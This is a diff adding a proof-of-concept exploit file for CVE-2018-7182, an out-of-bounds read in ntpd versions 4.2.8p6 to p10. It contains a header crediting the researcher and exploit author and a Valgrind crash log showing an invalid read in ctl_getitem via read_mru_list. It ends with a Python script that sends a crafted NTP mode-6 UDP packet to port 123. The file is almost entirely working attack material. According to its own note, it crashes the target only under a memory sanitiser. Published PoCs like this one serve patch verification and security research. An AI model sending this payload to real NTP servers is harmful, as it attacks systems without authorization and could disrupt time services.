@@ -1,0 +1,60 @@
+# Exploit Title: ntpd 4.2.8p10 - Out-of-Bounds Read (PoC)
+# Bug Discovery: Yihan Lian, a security researcher of Qihoo 360 GearTeam
+# Exploit Author: Magnus Klaaborg Stubman (@magnusstubman)
+# Website: https://dumpco.re/blog/cve-2018-7182
+# Vendor Homepage: http://www.ntp.org/
+# Software Link: https://www.eecis.udel.edu/~ntp/ntp_spool/ntp4/ntp-4.2/ntp-4.2.8p10.tar.gz
+# Version: ntp 4.2.8p6 - 4.2.8p10
+# CVE: CVE-2018-7182
+
+# Note: this PoC exploit only crashes the target when target is ran under a memory sanitiser such as ASan / Valgrind
+#$ sudo valgrind ./ntpd/ntpd -n -c ~/resources/ntp.conf 
+#==50079== Memcheck, a memory error detector
+#==50079== Copyright (C) 2002-2013, and GNU GPL'd, by Julian Seward et al. 
+#==50079== Using Valgrind-3.10.0 and LibVEX; rerun with -h for copyright info
+#==50079== Command: ./ntpd/ntpd -n -c /home/magnus/resources/ntp.conf
+#==50079== 
+#12 Nov 09:26:19 ntpd[50079]: ntpd 4.2.8p10@1.3728-o Mon Nov 12 08:21:41 UTC 2018 (4): Starting
+#12 Nov 09:26:19 ntpd[50079]: Command line: ./ntpd/ntpd -n -c /home/magnus/resources/ntp.conf
+#12 Nov 09:26:19 ntpd[50079]: proto: precision = 1.331 usec (-19)
+#12 Nov 09:26:19 ntpd[50079]: switching logging to file /tmp/ntp.log
+#12 Nov 09:26:19 ntpd[50079]: Listen and drop on 0 v6wildcard [::]:123
+#12 Nov 09:26:19 ntpd[50079]: Listen and drop on 1 v4wildcard 0.0.0.0:123
+#12 Nov 09:26:19 ntpd[50079]: Listen normally on 2 lo 127.0.0.1:123
+#12 Nov 09:26:19 ntpd[50079]: Listen normally on 3 eth0 172.16.193.132:123
+#12 Nov 09:26:19 ntpd[50079]: Listen normally on 4 lo [::1]:123
+#12 Nov 09:26:19 ntpd[50079]: Listen normally on 5 eth0 [fe80::50:56ff:fe38:d7b8%2]:123
+#12 Nov 09:26:19 ntpd[50079]: Listening on routing socket on fd #22 for interface updates
+#==50079== Invalid read of size 1
+#==50079==    at 0x12B8CF: ctl_getitem (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x131BF8: read_mru_list (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x12FD65: process_control (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x1440F9: receive (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x12AAA3: ntpdmain (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x12AC2C: main (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==  Address 0x6c6b396 is 0 bytes after a block of size 6 alloc'd
+#==50079==    at 0x4C28C20: malloc (vg_replace_malloc.c:296)
+#==50079==    by 0x4C2AFCF: realloc (vg_replace_malloc.c:692)
+#==50079==    by 0x17AC63: ereallocz (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x130A5F: add_var (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x130BC5: set_var (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x131636: read_mru_list (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x12FD65: process_control (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x1440F9: receive (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x12AAA3: ntpdmain (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)
+#==50079==    by 0x12AC2C: main (in /home/magnus/projects/ntpd/ntp-4.2.8p10/ntpd/ntpd)                                                                                                                          
+#==50079==
+
+#!/usr/bin/env python
+
+import sys
+import socket
+
+buf = ("\x16\x0a\x00\x02\x00\x00\x00\x00\x00\x00\x00\x39\x6e\x6f\x6e\x63" +
+       "\x65\x3d\x64\x61\x33\x65\x62\x35\x31\x65\x62\x30\x32\x38\x38\x38" +
+       "\x64\x61\x32\x30\x39\x36\x34\x31\x39\x63\x2c\x20\x66\x72\x61\x67" +
+       "\x73\x3d\x33\x32\x2c\x20\x6c\x61\x64\x64\x72\x00\x31\x32\x37\x2e" +
+       "\x30\x2e\x30\x2e\x31\x00\x00\x00")
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.sendto(buf, ('127.0.0.1', 123))
